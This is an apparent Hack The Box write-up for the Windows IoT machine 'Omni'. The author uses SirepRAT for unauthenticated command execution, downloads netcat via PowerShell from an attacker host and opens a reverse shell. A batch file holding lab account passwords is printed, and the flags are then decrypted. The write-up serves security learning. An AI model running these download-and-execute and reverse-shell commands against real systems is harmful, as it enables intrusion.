Remember when I said that Tabby was the shortest box I have solved? Yea.. Redact that. We have a new box that just made it to the top. As the info card says that the OS is unknown. To be honest I didn't notice any differences than a normal windows box. It was just another powershell practice session for me. All being said, it doesn't mean I disliked the box. I like all the boxes because in the end they are just puzzles that vary in difficulty. And did I ever tell you I **love** puzzles? Enough rant... I can't wait to root another box so lets get done with this write-up.

Kick off the nmap scan.

The only interesting port I see is the web server at port 8080. Browsing...

<img src="/images/omni/login.png" />

this is the first and last time I see this page. We see a clue right off the bat "Windows Device Portal". I look it up and fair enough I find it is a web interface for Windows iot devices. I find some documentation about default creds but that didn't work. 
[Reference](https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal)

After some more research I find a tool called SirepRAT made by SafeBreach Labs. [link to the tool](https://github.com/SafeBreach-Labs/SirepRAT).

I took a look at the python script and see that it is just sending/receiving the data using sockets but that was about it. I didn't understand how the tool works due to my limited knowledge about IOTs but that is something I think is an important part of being in this field i.e accepting that I don't know everything and that is alright.

We have unauthenticated RCE already. Today is a good day. So I read the instruction using th "--h" parameter. I see we can download, upload, get system info and run commands. First I tried uploading a netcat binary and tried to run using the launch commmand feature. Nope.

I didn't see any requests on my python server for any file. So I try to use just the launching commands feature to upload the binary and execute it. I know 3 methods to do so. Fisrt is using curl, second is using certutil and third is using powershell's invoke-webrequest command. The power shell method worked. 

{%highlight text%}
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/C Powershell Invoke-WebRequest http://YourIP:port/nc64.exe -OutFile C:\Windows\Temp\nc64.exe" --vv

{%endhighlight%}

We see a request on the python server. Next is to execute the netcat and get a reverse shell. After playing around a bit I get it to work. Remember to start a netcat listener in another tab.

{%highlight text%}
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/C C:\Windows\Temp\nc64.exe YourIP 1234 -e powershell.exe" --vv
{%endhighlight%}

And we have a shell. Doing the starting enumeration we see that "whoami" is not available, so we use `echo %username%` instead.

{%highlight text%}
C:\>echo %username%
echo %username%
omni$

C:\>net user

{%endhighlight%}

Ohh...! Do you see it? OpenSSH is installed. But I didn't see anything in the nmap scan. So as it says I browse to `C:\windows\System32\OpenSSH\`
and see a bunch of binaries. I try to run the "sshd.exe" binary which is used to start the ssh server and it just made the shell unresponsive **BUT** now when I do something "netstat -aon" or try to connect to a random user using ssh from my machine I can see that it doesn't say connection refused. If the ssh server was not active then it would have given me that error.

I need to find either the keys or the passwords for the users. I did find some keys but they didn't work. Now comes the most annoying part of this box which is opening each and every directory to information. I spent most of my time solving the box here.

I found that I can already read the user and root flags which are inside `C:\Data\Users\app` and `\root` respectively. It looked like they encrypted though. I do some research again to find [this awesome article](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx).

The PSCredential class is used to create objects by taking username and password from the user. After that this object can be passed to other processes that require credentials. In our case, this class was used to make objects with flag as password and stored inside user.txt file. When I follow the instruction given in the above mentioned article I face some crypto errors which are probably because I am not privileged enough to perform those actions.  

Fast-Forward 3 hours I finally find a hidden file inside `C:\program files\windowspowershell\modules\packagemanagement` named "r.bat".
I print out its contents and we have hit the jackpot!

{%highlight text%}
PS C:\program files\windowspowershell\modules\packagemanagement> cat r.bat
cat r.bat
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
{%endhighlight%}

Now we have creds for the user "app" and "administrator". Next I try to ssh into these accounts.

It worked! Next I again try to follow the instruction given in [the article](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx).

And we the user flag. Same thing for the administrator.

This box was a big confidence booster for me. I used to be afraid of windows machines but I am getting better. With this I have run out of all the easy boxes and next stop is medium boxes.
